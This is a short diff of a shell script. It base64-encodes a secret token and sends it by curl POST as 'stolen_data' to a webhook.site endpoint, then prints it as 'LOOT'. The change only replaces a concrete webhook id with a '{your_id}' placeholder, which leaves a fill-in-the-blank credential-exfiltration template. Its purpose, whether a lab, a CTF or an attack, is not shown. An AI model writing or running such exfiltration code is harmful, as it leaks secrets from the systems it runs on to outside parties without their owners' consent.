@@ -15,7 +15,7 @@ else
     ENCODED=$(echo -n "$SECRET_TOKEN" | base64)
 
     # 2. Exfiltration 
-    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/c426f279-0dc3-432a-b1dc-15c2acd1b2ce
+    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/{your_id}
     
     echo ""
     echo ">>> LOOT: $ENCODED <<<"
